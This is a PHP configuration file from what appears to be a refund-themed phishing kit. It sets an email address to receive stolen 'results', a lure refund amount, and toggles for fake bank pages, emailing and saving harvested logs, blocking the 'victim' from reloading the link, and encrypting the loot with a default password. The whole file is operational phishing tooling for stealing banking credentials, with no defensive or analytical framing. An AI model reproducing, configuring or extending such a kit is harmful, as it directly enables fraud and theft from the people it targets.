<?php

$my_email = "jumanjino@protonmail.com"; // YOUR EMAIL GOES HERE
$refund = "269.72"; // REFUND AMOUNT
$logsresults = "1"; // ENABLE/DISABLE BANK PAGES
$Send_Log=1;  // SEND RESULTS TO EMAIL
$Save_Log=1;  // SAVE RESULTS TO CPANEL
$One_Time_Access=0; // ONE TIME ACCESS, THIS PREVENTS THE VICTIM FROM LOADING THE LINK AGAIN AFTER SUBMIT
$Encrypt=0; // THIS FEATURE ENCRYPTS THE RESULTS AND CAN BE DECRYPTED WITH REDCRYPT
$password = '123'; // PASSWORD TO DECRYPT, CAN BE CHANGED


function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
?>